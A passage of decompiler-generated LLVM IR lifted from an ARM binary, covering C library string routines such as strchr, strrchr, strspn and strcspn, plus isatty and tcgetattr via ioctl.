  uselistorder i1* %cpsr_z.global-to-local, { 3, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 4, 21, 22, 23, 24, 25, 2, 26, 0, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 3, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 4, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 3, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 4, 22, 23, 24, 25, 26, 2, 27, 0, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -12, { 2, 12, 13, 3, 15, 16, 4, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 0, 5, 1, 23, 24 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 27, { 1, 0, 2, 3 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -4, { 17, 62, 63, 64, 6, 18, 19, 20, 65, 66, 67, 7, 21, 22, 23, 68, 69, 70, 8, 24, 25, 71, 16, 15, 72, 73, 74, 14, 13, 12, 11, 26, 27, 28, 29, 30, 5, 31, 3, 32, 4, 75, 10, 33, 49, 50, 51, 9, 52, 53, 54, 34, 48, 2, 35, 42, 43, 44, 45, 46, 47, 0, 1, 55, 56, 57, 58, 59, 60, 61, 36, 39, 40, 41, 37, 38 }
  uselistorder label %dec_label_pc_19100, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19094, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19028, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18fc8, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_18f54, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_18f18, { 1, 0 }
  uselistorder label %dec_label_pc_18f04, { 1, 0 }
  uselistorder label %dec_label_pc_18ec4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18e58, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18dec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18d8c, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_18d5c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_18cf8, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_18cb8, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_19124.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_19124 = phi i32 [ %v0_19124.pre, %bb ], [ %v5_19124, %bb3 ]
  %v0_19120 = phi i32 [ %tmp, %bb ], [ %v5_19120, %bb3 ]
  %v1_19120 = inttoptr i32 %v0_19120 to i8*
  %v2_19120 = load i8, i8* %v1_19120, align 1
  %v1_19124 = inttoptr i32 %v0_19124 to i8*
  %v2_19124 = load i8, i8* %v1_19124, align 1
  %v3_19124 = zext i8 %v2_19124 to i32
  %v2_19128 = icmp eq i8 %v2_19120, 0
  br i1 %v2_19128, label %.dec_label_pc_19134_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_19124 = add i32 %v0_19124, 1
  %v5_19120 = add i32 %v0_19120, 1
  %v3_19120 = zext i8 %v2_19120 to i32
  %v10_1912c = icmp eq i8 %v2_19120, %v2_19124
  br i1 %v10_1912c, label %entry, label %dec_label_pc_19134

.dec_label_pc_19134_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_19134

dec_label_pc_19134:                               ; preds = %bb3, %.dec_label_pc_19134_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_19134_crit_edge ], [ %v3_19120, %bb3 ]
  %v2_19134.pre-phi = sub nsw i32 %.pn, %v3_19124
  ret i32 %v2_19134.pre-phi

; uselistorder directives
  uselistorder i8 %v2_19120, { 0, 2, 1 }
  uselistorder i32 %v0_19120, { 1, 0 }
  uselistorder i32 %v0_19124, { 1, 0 }
  uselistorder label %dec_label_pc_19134, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_191a4 = urem i32 %arg1, 256
  %v0_191c43 = load i32, i32* @r0, align 4
  %v1_191c44 = urem i32 %v0_191c43, 4
  %v2_191c45 = icmp eq i32 %v1_191c44, 0
  br i1 %v2_191c45, label %dec_label_pc_191cc, label %dec_label_pc_191ac

dec_label_pc_191ac:                               ; preds = %entry, %dec_label_pc_191c0
  %v0_191c0 = phi i32 [ %v1_191c0, %dec_label_pc_191c0 ], [ %v0_191c43, %entry ]
  %v1_191ac = inttoptr i32 %v0_191c0 to i8*
  %v2_191ac = load i8, i8* %v1_191ac, align 1
  %v3_191ac = zext i8 %v2_191ac to i32
  %v9_191b0 = icmp eq i32 %v3_191ac, %v1_191a4
  br i1 %v9_191b0, label %dec_label_pc_19280, label %dec_label_pc_191b8

dec_label_pc_191b8:                               ; preds = %dec_label_pc_191ac
  %v2_191b8 = icmp eq i8 %v2_191ac, 0
  br i1 %v2_191b8, label %dec_label_pc_1927c, label %dec_label_pc_191c0

dec_label_pc_191c0:                               ; preds = %dec_label_pc_191b8
  %v1_191c0 = add i32 %v0_191c0, 1
  %v1_191c4 = urem i32 %v1_191c0, 4
  %v2_191c4 = icmp eq i32 %v1_191c4, 0
  br i1 %v2_191c4, label %dec_label_pc_191cc, label %dec_label_pc_191ac

dec_label_pc_191cc:                               ; preds = %dec_label_pc_191c0, %entry
  %v0_191d0 = phi i32 [ %v0_191c43, %entry ], [ %v1_191c0, %dec_label_pc_191c0 ]
  %v4_191cc = mul nuw nsw i32 %v1_191a4, 256
  %v5_191cc = or i32 %v4_191cc, %v1_191a4
  %v4_191d4 = mul i32 %v5_191cc, 65536
  %v5_191d4 = or i32 %v4_191d4, %v5_191cc
  br label %dec_label_pc_191d8

dec_label_pc_191d8:                               ; preds = %dec_label_pc_19274, %dec_label_pc_19214, %dec_label_pc_191cc
  %v0_1923c = phi i32 [ %v0_191d0, %dec_label_pc_191cc ], [ %v4_191d8, %dec_label_pc_19214 ], [ %v4_191d8, %dec_label_pc_19274 ]
  %v1_191d8 = inttoptr i32 %v0_1923c to i32*
  %v2_191d8 = load i32, i32* %v1_191d8, align 4
  %v4_191d8 = add i32 %v0_1923c, 4
  %v2_191e0 = xor i32 %v2_191d8, %v5_191d4
  %v2_191ec = add i32 %v2_191d8, 2130640639
  %v1_191f0 = sub i32 -1, %v2_191d8
  %v2_191f4 = xor i32 %v2_191ec, %v1_191f0
  %v2_19200 = and i32 %v2_191f4, -2130640640
  %v2_19208 = icmp eq i32 %v2_19200, 0
  br i1 %v2_19208, label %dec_label_pc_19214, label %dec_label_pc_1921c

dec_label_pc_19214:                               ; preds = %dec_label_pc_191d8
  %v2_191e4 = add i32 %v2_191e0, 2130640639
  %v1_191fc = sub i32 -1, %v2_191e0
  %v2_19204 = xor i32 %v2_191e4, %v1_191fc
  %v2_1920c = and i32 %v2_19204, -2130640640
  %v2_19214 = icmp eq i32 %v2_1920c, 0
  br i1 %v2_19214, label %dec_label_pc_191d8, label %dec_label_pc_1921c

dec_label_pc_1921c:                               ; preds = %dec_label_pc_191d8, %dec_label_pc_19214
  %v2_1921c = inttoptr i32 %v0_1923c to i8*
  %v3_1921c = load i8, i8* %v2_1921c, align 1
  %v4_1921c = zext i8 %v3_1921c to i32
  %v9_19220 = icmp eq i32 %v4_1921c, %v1_191a4
  br i1 %v9_19220, label %dec_label_pc_19280, label %dec_label_pc_1922c

dec_label_pc_1922c:                               ; preds = %dec_label_pc_1921c
  %v2_1922c = icmp eq i8 %v3_1921c, 0
  br i1 %v2_1922c, label %dec_label_pc_1927c, label %dec_label_pc_19234

dec_label_pc_19234:                               ; preds = %dec_label_pc_1922c
  %v1_19234 = add i32 %v0_1923c, 1
  %v2_19234 = inttoptr i32 %v1_19234 to i8*
  %v3_19234 = load i8, i8* %v2_19234, align 1
  %v4_19234 = zext i8 %v3_19234 to i32
  %v9_19238 = icmp eq i32 %v4_19234, %v1_191a4
  br i1 %v9_19238, label %dec_label_pc_19280, label %dec_label_pc_19244

dec_label_pc_19244:                               ; preds = %dec_label_pc_19234
  %v2_19244 = icmp eq i8 %v3_19234, 0
  br i1 %v2_19244, label %dec_label_pc_1927c, label %dec_label_pc_1924c

dec_label_pc_1924c:                               ; preds = %dec_label_pc_19244
  %v1_1924c = add i32 %v0_1923c, 2
  %v2_1924c = inttoptr i32 %v1_1924c to i8*
  %v3_1924c = load i8, i8* %v2_1924c, align 1
  %v4_1924c = zext i8 %v3_1924c to i32
  %v9_19250 = icmp eq i32 %v4_1924c, %v1_191a4
  br i1 %v9_19250, label %dec_label_pc_19280, label %dec_label_pc_1925c

dec_label_pc_1925c:                               ; preds = %dec_label_pc_1924c
  %v2_1925c = icmp eq i8 %v3_1924c, 0
  br i1 %v2_1925c, label %dec_label_pc_1927c, label %dec_label_pc_19264

dec_label_pc_19264:                               ; preds = %dec_label_pc_1925c
  %v1_19264 = add i32 %v0_1923c, 3
  %v2_19264 = inttoptr i32 %v1_19264 to i8*
  %v3_19264 = load i8, i8* %v2_19264, align 1
  %v4_19264 = zext i8 %v3_19264 to i32
  %v9_19268 = icmp eq i32 %v4_19264, %v1_191a4
  br i1 %v9_19268, label %dec_label_pc_19280, label %dec_label_pc_19274

dec_label_pc_19274:                               ; preds = %dec_label_pc_19264
  %v2_19274 = icmp eq i8 %v3_19264, 0
  br i1 %v2_19274, label %dec_label_pc_1927c, label %dec_label_pc_191d8

dec_label_pc_1927c:                               ; preds = %dec_label_pc_191b8, %dec_label_pc_19274, %dec_label_pc_1925c, %dec_label_pc_19244, %dec_label_pc_1922c
  br label %dec_label_pc_19280

dec_label_pc_19280:                               ; preds = %dec_label_pc_191ac, %dec_label_pc_19264, %dec_label_pc_1924c, %dec_label_pc_19234, %dec_label_pc_1921c, %dec_label_pc_1927c
  %v1_19284 = phi i32 [ 0, %dec_label_pc_1927c ], [ %v1_19264, %dec_label_pc_19264 ], [ %v1_1924c, %dec_label_pc_1924c ], [ %v1_19234, %dec_label_pc_19234 ], [ %v0_1923c, %dec_label_pc_1921c ], [ %v0_191c0, %dec_label_pc_191ac ]
  ret i32 %v1_19284

; uselistorder directives
  uselistorder i32 %v4_191d8, { 1, 0 }
  uselistorder i32 %v2_191d8, { 0, 2, 1 }
  uselistorder i32 %v0_1923c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_191cc, { 1, 0 }
  uselistorder i32 %v1_191c0, { 1, 0, 2 }
  uselistorder i32 %v0_191c43, { 2, 1, 0 }
  uselistorder i32 %v1_191a4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_19280, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1927c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1921c, { 1, 0 }
  uselistorder label %dec_label_pc_191ac, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_19294 = urem i32 %arg1, 256
  %v0_192b42 = load i32, i32* @r0, align 4
  %v1_192b43 = urem i32 %v0_192b42, 4
  %v2_192b44 = icmp eq i32 %v1_192b43, 0
  br i1 %v2_192b44, label %dec_label_pc_192bc, label %dec_label_pc_1929c

dec_label_pc_1929c:                               ; preds = %entry, %dec_label_pc_192b0
  %v0_192b0 = phi i32 [ %v1_192b0, %dec_label_pc_192b0 ], [ %v0_192b42, %entry ]
  %v1_1929c = inttoptr i32 %v0_192b0 to i8*
  %v2_1929c = load i8, i8* %v1_1929c, align 1
  %v3_1929c = zext i8 %v2_1929c to i32
  %v9_192a0 = icmp eq i32 %v3_1929c, %v1_19294
  br i1 %v9_192a0, label %dec_label_pc_1936c, label %dec_label_pc_192a8

dec_label_pc_192a8:                               ; preds = %dec_label_pc_1929c
  %v2_192a8 = icmp eq i8 %v2_1929c, 0
  br i1 %v2_192a8, label %dec_label_pc_1936c, label %dec_label_pc_192b0

dec_label_pc_192b0:                               ; preds = %dec_label_pc_192a8
  %v1_192b0 = add i32 %v0_192b0, 1
  %v1_192b4 = urem i32 %v1_192b0, 4
  %v2_192b4 = icmp eq i32 %v1_192b4, 0
  br i1 %v2_192b4, label %dec_label_pc_192bc, label %dec_label_pc_1929c

dec_label_pc_192bc:                               ; preds = %dec_label_pc_192b0, %entry
  %v0_192c0 = phi i32 [ %v0_192b42, %entry ], [ %v1_192b0, %dec_label_pc_192b0 ]
  %v4_192bc = mul nuw nsw i32 %v1_19294, 256
  %v5_192bc = or i32 %v4_192bc, %v1_19294
  %v4_192c4 = mul i32 %v5_192bc, 65536
  %v5_192c4 = or i32 %v4_192c4, %v5_192bc
  br label %dec_label_pc_192c8

dec_label_pc_192c8:                               ; preds = %dec_label_pc_19364, %dec_label_pc_19304, %dec_label_pc_192bc
  %v0_1932c = phi i32 [ %v0_192c0, %dec_label_pc_192bc ], [ %v4_192c8, %dec_label_pc_19304 ], [ %v4_192c8, %dec_label_pc_19364 ]
  %v1_192c8 = inttoptr i32 %v0_1932c to i32*
  %v2_192c8 = load i32, i32* %v1_192c8, align 4
  %v4_192c8 = add i32 %v0_1932c, 4
  %v2_192d0 = xor i32 %v2_192c8, %v5_192c4
  %v2_192dc = add i32 %v2_192c8, 2130640639
  %v1_192e0 = sub i32 -1, %v2_192c8
  %v2_192e4 = xor i32 %v2_192dc, %v1_192e0
  %v2_192f0 = and i32 %v2_192e4, -2130640640
  %v2_192f8 = icmp eq i32 %v2_192f0, 0
  br i1 %v2_192f8, label %dec_label_pc_19304, label %dec_label_pc_1930c

dec_label_pc_19304:                               ; preds = %dec_label_pc_192c8
  %v2_192d4 = add i32 %v2_192d0, 2130640639
  %v1_192ec = sub i32 -1, %v2_192d0
  %v2_192f4 = xor i32 %v2_192d4, %v1_192ec
  %v2_192fc = and i32 %v2_192f4, -2130640640
  %v2_19304 = icmp eq i32 %v2_192fc, 0
  br i1 %v2_19304, label %dec_label_pc_192c8, label %dec_label_pc_1930c

dec_label_pc_1930c:                               ; preds = %dec_label_pc_192c8, %dec_label_pc_19304
  %v2_1930c = inttoptr i32 %v0_1932c to i8*
  %v3_1930c = load i8, i8* %v2_1930c, align 1
  %v4_1930c = zext i8 %v3_1930c to i32
  %v9_19310 = icmp eq i32 %v4_1930c, %v1_19294
  br i1 %v9_19310, label %dec_label_pc_1936c, label %dec_label_pc_1931c

dec_label_pc_1931c:                               ; preds = %dec_label_pc_1930c
  %v2_1931c = icmp eq i8 %v3_1930c, 0
  br i1 %v2_1931c, label %dec_label_pc_1936c, label %dec_label_pc_19324

dec_label_pc_19324:                               ; preds = %dec_label_pc_1931c
  %v1_19324 = add i32 %v0_1932c, 1
  %v2_19324 = inttoptr i32 %v1_19324 to i8*
  %v3_19324 = load i8, i8* %v2_19324, align 1
  %v4_19324 = zext i8 %v3_19324 to i32
  %v9_19328 = icmp eq i32 %v4_19324, %v1_19294
  br i1 %v9_19328, label %dec_label_pc_1936c, label %dec_label_pc_19334

dec_label_pc_19334:                               ; preds = %dec_label_pc_19324
  %v2_19334 = icmp eq i8 %v3_19324, 0
  br i1 %v2_19334, label %dec_label_pc_1936c, label %dec_label_pc_1933c

dec_label_pc_1933c:                               ; preds = %dec_label_pc_19334
  %v1_1933c = add i32 %v0_1932c, 2
  %v2_1933c = inttoptr i32 %v1_1933c to i8*
  %v3_1933c = load i8, i8* %v2_1933c, align 1
  %v4_1933c = zext i8 %v3_1933c to i32
  %v9_19340 = icmp eq i32 %v4_1933c, %v1_19294
  br i1 %v9_19340, label %dec_label_pc_1936c, label %dec_label_pc_1934c

dec_label_pc_1934c:                               ; preds = %dec_label_pc_1933c
  %v2_1934c = icmp eq i8 %v3_1933c, 0
  br i1 %v2_1934c, label %dec_label_pc_1936c, label %dec_label_pc_19354

dec_label_pc_19354:                               ; preds = %dec_label_pc_1934c
  %v1_19354 = add i32 %v0_1932c, 3
  %v2_19354 = inttoptr i32 %v1_19354 to i8*
  %v3_19354 = load i8, i8* %v2_19354, align 1
  %v4_19354 = zext i8 %v3_19354 to i32
  %v9_19358 = icmp eq i32 %v4_19354, %v1_19294
  br i1 %v9_19358, label %dec_label_pc_1936c, label %dec_label_pc_19364

dec_label_pc_19364:                               ; preds = %dec_label_pc_19354
  %v2_19364 = icmp eq i8 %v3_19354, 0
  br i1 %v2_19364, label %dec_label_pc_1936c, label %dec_label_pc_192c8

dec_label_pc_1936c:                               ; preds = %dec_label_pc_192a8, %dec_label_pc_1929c, %dec_label_pc_19364, %dec_label_pc_19354, %dec_label_pc_1934c, %dec_label_pc_1933c, %dec_label_pc_19334, %dec_label_pc_19324, %dec_label_pc_1931c, %dec_label_pc_1930c
  %v1_19370 = phi i32 [ %v1_19354, %dec_label_pc_19364 ], [ %v1_19354, %dec_label_pc_19354 ], [ %v1_1933c, %dec_label_pc_1934c ], [ %v1_1933c, %dec_label_pc_1933c ], [ %v1_19324, %dec_label_pc_19334 ], [ %v1_19324, %dec_label_pc_19324 ], [ %v0_1932c, %dec_label_pc_1931c ], [ %v0_1932c, %dec_label_pc_1930c ], [ %v0_192b0, %dec_label_pc_1929c ], [ %v0_192b0, %dec_label_pc_192a8 ]
  ret i32 %v1_19370

; uselistorder directives
  uselistorder i32 %v4_192c8, { 1, 0 }
  uselistorder i32 %v2_192c8, { 0, 2, 1 }
  uselistorder i32 %v0_1932c, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_192bc, { 1, 0 }
  uselistorder i32 %v1_192b0, { 1, 0, 2 }
  uselistorder i32 %v0_192b42, { 2, 1, 0 }
  uselistorder i32 %v1_19294, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_1936c, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_1930c, { 1, 0 }
  uselistorder label %dec_label_pc_1929c, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_1937c = load i32, i32* @r4, align 4
  store i32 %v3_1937c, i32* %stack_var_-16, align 4
  %v6_1937c = load i32, i32* @r5, align 4
  %v9_1937c = load i32, i32* @r6, align 4
  %v0_19380 = load i32, i32* @r0, align 4
  %v0_19384 = load i32, i32* @r1, align 4
  store i32 %v0_19384, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_193a08 = inttoptr i32 %v0_19380 to i8*
  %v2_193a09 = load i8, i8* %v1_193a08, align 1
  %v2_193a411 = icmp eq i8 %v2_193a09, 0
  store i32 %v0_19384, i32* @r0, align 4
  %v1_193ac12 = add i32 %v0_19380, 1
  store i32 %v1_193ac12, i32* @r4, align 4
  br i1 %v2_193a411, label %dec_label_pc_193b4, label %dec_label_pc_19390

dec_label_pc_19390:                               ; preds = %entry, %dec_label_pc_1939c
  %v3_193a014.in = phi i8 [ %v2_193a0, %dec_label_pc_1939c ], [ %v2_193a09, %entry ]
  %v0_193a813 = phi i32 [ %v0_193a8.pre, %dec_label_pc_1939c ], [ %v0_19384, %entry ]
  %v3_193a014 = zext i8 %v3_193a014.in to i32
  %v2_19390 = call i32 @__GI_strchr(i32 %v0_193a813, i32 %v3_193a014)
  %v2_19394 = icmp eq i32 %v2_19390, 0
  %v0_1939c = load i32, i32* @r5, align 4
  br i1 %v2_19394, label %dec_label_pc_1939c, label %dec_label_pc_193b4

dec_label_pc_1939c:                               ; preds = %dec_label_pc_19390
  %v1_1939c = add i32 %v0_1939c, 1
  %v0_193a0.pre = load i32, i32* @r4, align 4
  %v0_193a8.pre = load i32, i32* @r6, align 4
  store i32 %v1_1939c, i32* @r5, align 4
  %v1_193a0 = inttoptr i32 %v0_193a0.pre to i8*
  %v2_193a0 = load i8, i8* %v1_193a0, align 1
  %v2_193a4 = icmp eq i8 %v2_193a0, 0
  store i32 %v0_193a8.pre, i32* @r0, align 4
  %v1_193ac = add i32 %v0_193a0.pre, 1
  store i32 %v1_193ac, i32* @r4, align 4
  br i1 %v2_193a4, label %dec_label_pc_193b4, label %dec_label_pc_19390

dec_label_pc_193b4:                               ; preds = %dec_label_pc_1939c, %dec_label_pc_19390, %entry
  %v0_193b4 = phi i32 [ 0, %entry ], [ %v0_1939c, %dec_label_pc_19390 ], [ %v1_1939c, %dec_label_pc_1939c ]
  %v2_193b8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_193b8, i32* @r4, align 4
  store i32 %v6_1937c, i32* @r5, align 4
  store i32 %v9_1937c, i32* @r6, align 4
  ret i32 %v0_193b4

; uselistorder directives
  uselistorder i8 %v2_193a0, { 1, 0 }
  uselistorder i32 %v0_193a8.pre, { 1, 0 }
  uselistorder i32 %v0_193a0.pre, { 1, 0 }
  uselistorder label %dec_label_pc_19390, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_193c4 = urem i32 %arg2, 256
  store i32 %v1_193c4, i32* @r4, align 4
  %v2_193c4 = icmp eq i32 %v1_193c4, 0
  br i1 %v2_193c4, label %dec_label_pc_193d8, label %dec_label_pc_193ec.preheader

dec_label_pc_193ec.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_193f43 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_193c4)
  %v2_193f85 = icmp eq i32 %v2_193f43, 0
  br i1 %v2_193f85, label %dec_label_pc_19400, label %dec_label_pc_193e4

dec_label_pc_193d8:                               ; preds = %entry
  %v2_193dc = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_19404

dec_label_pc_193e4:                               ; preds = %dec_label_pc_193ec.preheader, %dec_label_pc_193e4
  %v2_193f46 = phi i32 [ %v2_193f4, %dec_label_pc_193e4 ], [ %v2_193f43, %dec_label_pc_193ec.preheader ]
  store i32 %v2_193f46, i32* @r5, align 4
  %v1_193e8 = add i32 %v2_193f46, 1
  store i32 %v1_193e8, i32* @r0, align 4
  %v0_193f0 = load i32, i32* @r4, align 4
  %v2_193f4 = call i32 @__GI_strchr(i32 %v1_193e8, i32 %v0_193f0)
  %v2_193f8 = icmp eq i32 %v2_193f4, 0
  br i1 %v2_193f8, label %dec_label_pc_19400, label %dec_label_pc_193e4

dec_label_pc_19400:                               ; preds = %dec_label_pc_193e4, %dec_label_pc_193ec.preheader
  %v0_19400 = load i32, i32* @r5, align 4
  br label %dec_label_pc_19404

dec_label_pc_19404:                               ; preds = %dec_label_pc_193d8, %dec_label_pc_19400
  %storemerge = phi i32 [ %v2_193dc, %dec_label_pc_193d8 ], [ %v0_19400, %dec_label_pc_19400 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_193f4, { 1, 0 }
  uselistorder i32 %v1_193e8, { 1, 0 }
  uselistorder i32 %v1_193c4, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_19404, { 1, 0 }
  uselistorder label %dec_label_pc_193e4, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_194402 = load i32, i32* @r0, align 4
  %v1_194403 = inttoptr i32 %v0_194402 to i8*
  %v2_194404 = load i8, i8* %v1_194403, align 1
  %v2_194446 = icmp eq i8 %v2_194404, 0
  br i1 %v2_194446, label %dec_label_pc_19450, label %dec_label_pc_19424.preheader

dec_label_pc_1941c:                               ; preds = %dec_label_pc_19424
  %v1_1942c = add i32 %v0_1942c, 1
  %v9_1941c = icmp eq i8 %v0_1941c10.in, %v2_19424
  br i1 %v9_1941c, label %dec_label_pc_19438, label %dec_label_pc_19424

dec_label_pc_19424:                               ; preds = %dec_label_pc_19424.preheader, %dec_label_pc_1941c
  %v0_1942c = phi i32 [ %tmp, %dec_label_pc_19424.preheader ], [ %v1_1942c, %dec_label_pc_1941c ]
  %v1_19424 = inttoptr i32 %v0_1942c to i8*
  %v2_19424 = load i8, i8* %v1_19424, align 1
  %v2_19428 = icmp eq i8 %v2_19424, 0
  br i1 %v2_19428, label %dec_label_pc_19450, label %dec_label_pc_1941c

dec_label_pc_19438:                               ; preds = %dec_label_pc_1941c
  %v1_19438 = add i32 %v0_19438, 1
  %v1_1943c = add i32 %v0_1943c, 1
  %v1_19440 = inttoptr i32 %v1_1943c to i8*
  %v2_19440 = load i8, i8* %v1_19440, align 1
  %v2_19444 = icmp eq i8 %v2_19440, 0
  br i1 %v2_19444, label %dec_label_pc_19450, label %dec_label_pc_19424.preheader

dec_label_pc_19424.preheader:                     ; preds = %entry, %dec_label_pc_19438
  %v0_1943c = phi i32 [ %v1_1943c, %dec_label_pc_19438 ], [ %v0_194402, %entry ]
  %v0_19438 = phi i32 [ %v1_19438, %dec_label_pc_19438 ], [ 0, %entry ]
  %v0_1941c10.in = phi i8 [ %v2_19440, %dec_label_pc_19438 ], [ %v2_194404, %entry ]
  br label %dec_label_pc_19424

dec_label_pc_19450:                               ; preds = %dec_label_pc_19438, %dec_label_pc_19424, %entry
  %v0_19450 = phi i32 [ 0, %entry ], [ %v0_19438, %dec_label_pc_19424 ], [ %v1_19438, %dec_label_pc_19438 ]
  ret i32 %v0_19450

; uselistorder directives
  uselistorder i8 %v2_19424, { 1, 0 }
  uselistorder i32 %v0_1942c, { 1, 0 }
  uselistorder label %dec_label_pc_19424.preheader, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_19464 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_19464, i32* @r1, align 4
  %v0_19468 = call i32 @__GI_tcgetattr()
  %v1_1946c = sub i32 1, %v0_19468
  %v2_1946c = icmp ult i32 %v0_19468, 2
  br i1 %v2_1946c, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_1947c = phi i32 [ %v1_1946c, %entry ], [ 0, %bb ]
  ret i32 %v1_1947c

; uselistorder directives
  uselistorder i32 %v0_19468, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_19480 = load i32, i32* @r4, align 4
  %v6_19480 = load i32, i32* @r5, align 4
  %v9_19480 = load i32, i32* @r6, align 4
  %v2_19488 = ptrtoint i32* %stack_var_-52 to i32
  %v0_1948c = load i32, i32* @r1, align 4
  store i32 %v0_1948c, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_19498 = load i32, i32* @r0, align 4
  %v3_19498 = call i32 @ioctl(i32 %v0_19498, i32 21505, i32 %v2_19488)
  store i32 %v3_19498, i32* %r0.global-to-local, align 4
  store i32 %v3_19498, i32* @r5, align 4
  %v2_1949c = icmp eq i32 %v3_19498, 0
  br i1 %v2_1949c, label %dec_label_pc_194a4, label %dec_label_pc_194e8

dec_label_pc_194a4:                               ; preds = %entry
  %v4_194b0 = zext i8 %tmp to i32
  store i32 %v4_194b0, i32* @ip, align 4
  %v3_194b4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_194b4, i32* @r3, align 4
  %v1_194b8 = load i32, i32* @r4, align 4
  %v2_194b8 = add i32 %v1_194b8, 4
  %v3_194b8 = inttoptr i32 %v2_194b8 to i32*
  %v0_194bc = load i32, i32* %r1.global-to-local, align 4
  %v1_194bc = load i32, i32* @r4, align 4
  %v2_194bc = add i32 %v1_194bc, 8
  %v3_194bc = inttoptr i32 %v2_194bc to i32*
  store i32 %v0_194bc, i32* %v3_194bc, align 4
  %v0_194c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_194c0 = load i32, i32* @r4, align 4
  %v2_194c0 = add i32 %v1_194c0, 12
  %v3_194c0 = inttoptr i32 %v2_194c0 to i32*
  store i32 %v0_194c0, i32* %v3_194c0, align 4
  %v2_194c4 = ptrtoint i32* %stack_var_-35 to i32
